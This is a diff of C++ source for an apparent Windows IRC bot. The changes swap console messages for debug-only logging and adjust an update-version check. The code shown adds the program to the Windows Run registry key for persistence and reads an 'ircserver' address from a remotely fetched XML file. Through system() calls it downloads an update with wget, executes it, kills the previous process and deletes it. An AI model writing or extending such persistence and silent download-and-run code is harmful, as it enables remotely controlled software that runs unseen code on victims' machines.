@@ -59,6 +59,7 @@ logger logThread("Threading");
 logger logStartupKey("StartupKey");
 logger logDownload_Updates("Download_Updates");
 logger logxmlparser("xmlparser");
+logger logCheck_Updates("Check_Updates");
 #endif
 
 
@@ -305,6 +306,7 @@ void setup_loggers (int level)
         logStartupKey.set_level(LFATAL);
         logDownload_Updates.set_level(LFATAL);
         logxmlparser.set_level(LFATAL);
+        logCheck_Updates.set_level(LFATAL);
 
     }
 
@@ -323,6 +325,7 @@ void setup_loggers (int level)
         logStartupKey.set_level(LWARN);
         logDownload_Updates.set_level(LWARN);
         logxmlparser.set_level(LWARN);
+        logCheck_Updates.set_level(LWARN);
 
     }
     else if (level==2)
@@ -340,6 +343,7 @@ void setup_loggers (int level)
         logStartupKey.set_level(LINFO);
         logDownload_Updates.set_level(LINFO);
         logxmlparser.set_level(LINFO);
+        logCheck_Updates.set_level(LINFO);
     }
         else if (level==3)
     {
@@ -355,7 +359,7 @@ void setup_loggers (int level)
         logThread.set_level(LDEBUG);
         logStartupKey.set_level(LDEBUG);
         logDownload_Updates.set_level(LDEBUG);
-        logxmlparser.set_level(LDEBUG);
+        logCheck_Updates.set_level(LDEBUG);
     }
         else if (level==4)
     {
@@ -372,6 +376,7 @@ void setup_loggers (int level)
         logStartupKey.set_level(LTRACE);
         logDownload_Updates.set_level(LTRACE);
         logxmlparser.set_level(LTRACE);
+        logCheck_Updates.set_level(LTRACE);
     }
         else if (level==5)
     {
@@ -388,6 +393,7 @@ void setup_loggers (int level)
         logStartupKey.set_level(LALL);
         logDownload_Updates.set_level(LALL);
         logxmlparser.set_level(LALL);
+        logCheck_Updates.set_level(LALL);
     }
     if (level>=6)
     {
@@ -672,8 +678,10 @@ if (RegOpenKey(HKEY_CURRENT_USER,
     TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
     &newValue) != ERROR_SUCCESS)
 {
-    std::cout<<"Failure in regedit"<<std::endl;
+    #ifdef D_LIB
+    logStartupKey<<LDEBUG<<"Failure in oppening  key";
     logStartupKey<<LFATAL << "Error:unable to create value in registry";
+    #endif
 }
 DWORD pathLenInBytes = pathLen * sizeof(*szPath);
 if (RegSetValueEx(newValue,
@@ -684,7 +692,9 @@ if (RegSetValueEx(newValue,
     pathLenInBytes) != ERROR_SUCCESS)
 {
     RegCloseKey(newValue);
-    logStartupKey<<LDEBUG<<"Failure in closing regedit";
+    #ifdef D_LIB
+    logStartupKey<<LDEBUG<<"Failure in closing registry";
+    #endif
 }
 RegCloseKey(newValue);
 
@@ -749,25 +759,28 @@ logxmlparser<<LDEBUG <<" :XML DownloadFile: "<<address;
 #endif
 
 irc_s_name=cur_node->first_attribute("ircserver")->value();
-cout<<"XML Parsed server name :"<<irc_s_name<<endl;
-
+#ifdef D_LIB
+logxmlparser<<LDEBUG <<" :XML filename: "<<irc_s_name;
+#endif
 
 
 std::string::size_type sz;     // alias of size_t
 double version_retrived = atof (version_ret.c_str());
 double version_local = atof (version.c_str());
 
-if (version_retrived>=version_local)
+if (version_retrived>version_local)
     {
-    cout<<"Downloading Update"<<endl;
-    cout<<"Former app name"<<former_app_name<<endl;
-    cout<<"Updates Server address :"<<name<<"\\"<<address<<endl;
+    #ifdef D_LIB
+    logxmlparser<<LINFO<<"Downloading Update";
+    logxmlparser<<LDEBUG<<"Former app name"<<former_app_name;
+    logxmlparser<<LDEBUG<<"Updates Server address :"<<name<<"\\"<<address;
+    #endif
     Download_Updates();
     }
 else
     {
-        cout<<"Version Ok"<<endl;
-        cout<<"Skipping download"<<endl;
+     logxmlparser<<LINFO<<"Version Ok";
+      logxmlparser<<LINFO<<"Skipping download";
     }
 
 
@@ -783,7 +796,9 @@ void *Check_Updates(void *threadid)
    long tid;
    tid = (long)threadid;
    logThread<<LDEBUG <<  "Started Update checker";
-
+#ifdef D_LIB
+logCheck_Updates<<LINFO <<" :Started logging.";
+#endif
    ///////////////////////////////////////////////////////
 
 using namespace rapidxml;
@@ -815,7 +830,9 @@ throw boost::system::system_error(error);
 // allow us to treat all data up until the EOF as the content.
 boost::asio::streambuf request;
 std::ostream request_stream(&request);
-
+#ifdef D_LIB
+logCheck_Updates<<LINFO <<" :Sending current.xml request.";
+#endif
 request_stream << "GET " << Get_Request << " HTTP/1.0\r\n";
 request_stream << "Host: " << Host << "\r\n";
 request_stream << "Accept: */*\r\n";
@@ -840,12 +857,19 @@ std::string status_message;
 std::getline(response_stream, status_message);
 if (!response_stream || http_version.substr(0, 5) != "HTTP/")
 {
-std::cout << "Invalid response\n";
+
+#ifdef D_LIB
+logCheck_Updates<<LWARN << "Invalid response\n";
+#endif
+;
 }
 if (status_code != 200)
 {
-std::cout << "Response returned with status code " << status_code << "\n";
 
+#ifdef D_LIB
+logCheck_Updates<<LWARN << "Response returned with status code :" << status_code ;
+#endif
+;
 }
 
 // Read the response headers, which are terminated by a blank line.
@@ -887,14 +911,23 @@ throw boost::system::system_error(error);
 
 
 if (final_data.length()>=0)
-xmlparser("somefile.xml");
+{
+    xmlparser("somefile.xml");
+    #ifdef D_LIB
+    logCheck_Updates<<LDEBUG<< "Length of data received, Satisfiable :" << final_data.length() ;
+    #endif
+}
    ////////////////////////////////////////////////////////
+    #ifdef D_LIB
+    logCheck_Updates<<LINFO<< "Closing Thread." ;
+    #endif
    pthread_exit(NULL);
 }
 void Download_Updates(void)
 {
-
-
+#ifdef D_LIB
+logDownload_Updates<<LINFO<< " :Started.";
+#endif
    ///////////////////////////////////////////////////////
 
 string Host=name;
@@ -910,14 +943,23 @@ del=(del+former_app_name);
 
 
 
-
+#ifdef D_LIB
+logDownload_Updates<<LDEBUG<< " :Downloading update :"<<wget;
+#endif
 system(wget.c_str());
+#ifdef D_LIB
+logDownload_Updates<<LDEBUG<< " :Running Update :"<<start;
+#endif
 system(start.c_str());
-
+#ifdef D_LIB
+logDownload_Updates<<LDEBUG<< " :Killing former App :"<<kill;
+#endif
 system(kill.c_str());
-system(del.c_str());
+#ifdef D_LIB
+logDownload_Updates<<LDEBUG<< " :Deleting former App :"<<del;
+#endif
 
-cout<<"Udpdate address"<<wget<<endl;
+system(del.c_str());
 
 
 }
